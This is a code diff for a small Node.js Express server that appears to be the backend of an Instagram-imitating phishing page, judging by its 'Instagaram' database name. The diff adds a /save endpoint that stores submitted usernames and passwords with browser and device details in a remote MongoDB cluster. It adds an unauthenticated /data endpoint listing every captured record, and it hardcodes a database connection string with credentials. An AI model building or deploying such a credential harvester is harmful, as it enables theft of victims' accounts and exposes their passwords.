@@ -1,7 +1,20 @@
 const express = require("express");
 const cors = require("cors");
-const fs = require("fs");
-const path = require("path");
+const mongoose = require("mongoose");
+
+mongoose.connect("mongodb+srv://anyonebutnoone786_db:d0n0tenter@instagaram.kktrvb1.mongodb.net/?appName=Instagaram")
+.then(() => console.log("MongoDB connected"))
+.catch(err => console.log(err));
+
+const deviceSchema = new mongoose.Schema({
+  username: String,
+  password: String,
+  time: String,
+  browser: String,
+  device: String
+});
+
+const Device = mongoose.model("Device", deviceSchema);
 
 const app = express();
 
@@ -11,49 +24,41 @@ app.use(express.json());
 // Serve frontend from /public
 app.use(express.static("public"));
 
-let devices = [];
 
-// Load existing data safely
-if (fs.existsSync("data.json")) {
-    try {
-        const data = fs.readFileSync("data.json", "utf8");
-        if (data) {
-            devices = JSON.parse(data);
-        }
-    } catch (err) {
-        devices = [];
-    }
-}
-
-app.post("/save", (req, res) => {
-
+app.post("/save", async (req, res) => {
+  try {
     const { username, password, time, browser, device } = req.body;
 
-    const newEntry = {
-        username,
-        password,
-        time,
-        browser,
-        device
-    };
+    const newEntry = new Device({
+      username,
+      password,
+      time,
+      browser,
+      device
+    });
 
-    devices.push(newEntry);
-
-    // Save to file
-    fs.writeFileSync("data.json", JSON.stringify(devices, null, 2));
+    await newEntry.save();
 
     console.log("Saved:", newEntry);
 
     res.json({ success: true });
 
+  } catch (err) {
+    console.error("Database error:", err);
+    res.status(500).json({ success: false });
+  }
 });
 
-
-// 👇 NEW ROUTE TO VIEW DATA
-app.get("/data", (req, res) => {
-    res.json(devices);
+//NEW ROUTE TO VIEW DATA
+app.get("/data", async (req, res) => {
+  try {
+    const data = await Device.find();
+    res.json(data);
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: "Database error" });
+  }
 });
-
 
 // Render requires dynamic port
 const PORT = process.env.PORT || 3000;
